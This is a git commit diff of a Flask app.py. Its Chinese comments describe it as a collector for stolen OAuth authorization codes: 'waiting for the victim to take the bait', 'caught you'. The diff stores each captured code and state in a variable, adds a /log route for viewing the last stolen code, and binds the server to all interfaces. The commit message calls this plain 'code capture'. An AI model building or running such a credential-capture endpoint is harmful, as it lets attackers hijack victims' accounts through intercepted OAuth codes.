42cbe0e9c5119fe983abf02c04a24fed6105b26d
xiaoboluoboluo <715586653@qq.com>
2026-04-22 11:12:00 +0800

    Enhance code capture and logging functionality
    Added functionality to capture and display code from URL parameters. Introduced a logging route to view the last captured code.

--- app.py
+++ app.py
@@ -2,16 +2,28 @@ from flask import Flask, request
 
 app = Flask(__name__)
 
+# 用来存储抓到的 code
+stolen_code = ""
+
 @app.route('/')
 def home():
-    # 1. 获取 URL 中的 code
+    global stolen_code
+    # 获取 URL 中的 code 参数
     code = request.args.get('code')
-    
-    # 2. 如果有 code，就打印出来，或者发送到你的钉钉/微信
+    state = request.args.get('state')
+
     if code:
-        return f"抓到 Code 了！内容是: {code}"
+        stolen_code = code
+        # 如果有人带着 code 来了，就在页面上显示出来
+        return f"<h1>抓到你了！</h1><p>Code is: <b>{code}</b></p><p>State is: {state}</p>"
     else:
-        return "等待受害者上钩..."
+        # 如果没人来，就显示等待
+        return "等待受害者上钩... (当前没有捕获到Code)"
+
+@app.route('/log')
+def log():
+    # 这是一个备用接口，方便你看日志
+    return f"Last captured code: {stolen_code}"
 
 if __name__ == '__main__':
-    app.run()
+    app.run(host='0.0.0.0', port=8080)
